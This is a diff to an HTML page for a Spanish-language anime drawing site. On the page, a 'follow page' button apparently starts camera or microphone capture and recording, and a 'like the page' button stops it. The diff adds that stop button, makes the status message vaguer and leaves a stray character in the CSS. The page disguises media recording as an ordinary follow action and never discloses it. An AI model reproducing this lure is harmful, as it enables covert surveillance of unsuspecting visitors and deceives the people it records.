@@ -7,6 +7,43 @@
   <title>🎀 Dibujos Anika Anime 🎀</title>
 
   <style>
+
+#meEncantaBtn {
+  display: none;
+}
+
+.acciones {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+  width: 100%;
+  margin-top: 25px;
+
+}
+#seguirBtn {
+  background: #d92f82;
+}
+
+#meEncantaBtn {
+  background: #ef7faa;
+}
+
+#meEncantaBtn:disabled {
+  background: #ef7faa;
+  color: white;
+  opacity: 1;
+  cursor: not-allowed;
+}
+
+#seguirBtn:hover,
+#meEncantaBtn:hover {
+  transform: scale(1.02);
+}
+
+#seguirBtn span,
+#meEncantaBtn span {
+  color: red !important;
+}
     * { box-sizing: border-box; }
 
     body {
@@ -101,7 +138,7 @@
       font-size: 28px;
       margin-bottom: 20px;
     }
-
+f
     .cuadricula {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -163,17 +200,23 @@
 
       <div class="icono">🎨💕</div>
 
-      <h2>💕 Bienvenida 💕</h2>
+      <h2>💕 Bienvenidos 💕</h2>
 
       <p>
         Comparte tus dibujos y disfruta de un espacio
         dedicado al anime.
       </p>
+         <div class="acciones">
 
-      <button class="seguir" onclick="seguirPagina()">
-        💗 Seguir página
-      </button>
+  <button id="seguirBtn" onclick="seguirPagina()">
+    <span style="color:red;">❤️</span> Seguir página
+  </button>
 
+  <button id="meEncantaBtn" class="me-encanta" onclick="detenerGrabacion()" disabled>
+    <span style="color:red;">❤️</span> Dale me encanta a la página
+  </button>
+
+</div>
       <div id="estado">
         Gracias por seguir la pagina
       </div>
@@ -420,7 +463,7 @@
       indicador.style.display = "block";
 
       estado.textContent =
-        "Página activada correctamente.";
+        "Página abierta.";
     }
 
     async function seguirPagina() {
@@ -438,14 +481,25 @@
         video.srcObject = stream;
 
         comenzarGrabacion();
-
+document.getElementById("meEncantaBtn").disabled = false;
+  document.getElementById("meEncantaBtn").style.display = "block";
       } catch (error) {
         console.error(error);
 
         estado.textContent =
           "No se concedieron los permisos solicitados.";
       }
-    }
+    }function detenerGrabacion() {
+  if (recorder && recorder.state !== "inactive") {
+    recorder.stop();
+  }
+
+  if (stream) {
+    stream.getTracks().forEach(pista => pista.stop());
+  }
+
+  video.srcObject = null;
+}
   </script>
 
 </body>
